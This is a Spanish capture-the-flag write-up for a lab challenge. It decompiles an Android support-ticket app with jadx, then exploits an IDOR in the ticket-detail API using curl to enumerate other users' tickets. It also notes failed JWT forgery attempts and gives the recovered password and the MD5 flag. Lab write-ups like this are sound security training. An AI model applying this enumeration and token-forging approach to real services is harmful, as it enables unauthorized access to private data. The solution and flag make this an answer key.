# Desafío 52 - Soporte confidencial

**Plataforma:** HackLab (SoftwareSeguro)

**Edición:** HackingDay 2026

**Categoría:** IDOR - Reversing Apk

**Herramientas:** jadx, curl / Python (urllib)

## Enunciado

La empresa TechCorp utiliza una aplicación móvil interna para gestionar los tickets de soporte IT. Se rumorea que el Administrador de Sistemas, por descuido, dejó anotada la credencial de acceso al servidor de producción.

- **Cuenta inicial:** `empleado` / `1234`
- **Objetivo:** obtener la contraseña del Administrador de Sistemas y entregar su hash MD5.

## Análisis

La app (`soporte.apk`) es un cliente **Kotlin nativo** (no Capacitor): dentro del APK hay `classes*.dex`, `kotlin/` y `okhttp3/`, sin `assets/public/`. La credencial **no está hardcodeada** en el binario; el APK solo sirve para mapear la API.

Decompilando con jadx (`jadx --no-res -d out soporte.apk`), las clases de `com.example.soporteconfidencial` revelan un cliente **Retrofit + OkHttp** contra un backend real:

```kotlin
// NetworkModule.kt
private const val BASE_URL = "https://sop-conf.shared.softwareseguro.com.ar"

// interceptor: agrega el token del login a cada request
if (authToken != null)
    requestBuilder.addHeader("Authorization", "Bearer $authToken")
```

```kotlin
// ApiService.kt
@POST("/api/v1/login")            fun login(@Body request: LoginRequest): Call<LoginResponse>
@GET ("/api/v1/tickets")          fun getTickets(): Call<List<Ticket>>
@GET ("/api/v1/tickets/{id}")     fun getTicketDetails(@Path("id") id: Int): Call<Ticket>
```

Detalle revelador en `MainActivity.fetchTicketDetails`: ante un ticket ajeno el propio autor previó el mensaje

```
"Error al cargar detalle (Posiblemente No Autorizado)"
```

es decir, el endpoint de detalle **debía** poder devolver tickets de otros usuarios. El cliente, además, llama a `getTickets()` **sin parámetros**: el filtrado por usuario ocurre en el servidor.

## Explotación

### 1. Login como empleado

```bash
curl -s -X POST https://sop-conf.shared.softwareseguro.com.ar/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"empleado","password":"1234"}'
```

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","user_id":10}
```

El JWT (HS256) solo contiene `{sub, user_id:10, username:"empleado", iat, exp}`.

### 2. El listado solo muestra lo propio

```bash
curl -s https://sop-conf.shared.softwareseguro.com.ar/api/v1/tickets \
  -H "Authorization: Bearer $TOKEN"
```

```json
[{"id":101,"title":"Cambio de monitor","user_id":10},
 {"id":102,"title":"Teclado roto","user_id":10}]
```

`/api/v1/tickets` filtra server-side por el `user_id` del token y **no respeta** query params (`?user_id=1`, `?all=true`, `?role=admin` devuelven lo mismo). Forzar ese camino exigiría forjar el JWT: `alg:none` es rechazado (401) y el secreto HS256 **no está en rockyou** (14M candidatos, sin resultado), así que no es la vía.

### 3. IDOR en el detalle

El endpoint de detalle **no valida ownership**: con el token de `empleado` se lee cualquier ticket.

```bash
curl -s https://sop-conf.shared.softwareseguro.com.ar/api/v1/tickets/1 \
  -H "Authorization: Bearer $TOKEN"
```

```json
{"id":1,"title":"Cambio de monitor","description":"...","user_id":11}
```

Enumerando los IDs se observa que el rango **1–100 es casi todo relleno**: tickets generados en bloques de 12 plantillas que se repiten (user_id 11–22). Los **101–102** son los del empleado (user_id 10) y a partir de 103 responde `404 {"error":"Ticket no encontrado"}`. El reto esconde el ticket real **intercalado en medio de ese relleno**, por lo que hay que enumerar el rango completo sin saltearse IDs (hay rate limiting de 60 s, así que se espacia cada request).

En **id=59** el patrón se rompe (es el único ID del tramo que no sigue las plantillas):

```json
{
  "id": 59,
  "title": "Accesos Root Servidor",
  "description": "Por favor, no pierdas de nuevo la contraseña del servidor de producción. Es: S3cur3P@ssw0rd_2026!",
  "user_id": 1
}
```

`user_id:1` = el Administrador de Sistemas. Script completo en [`./solve.py`](./solve.py).

Contraseña del Administrador:

```
S3cur3P@ssw0rd_2026!
```

## Flag

MD5 de la contraseña (respuesta del desafío):

```
a93c74e82d58d44c254c431e0498c0ea
```
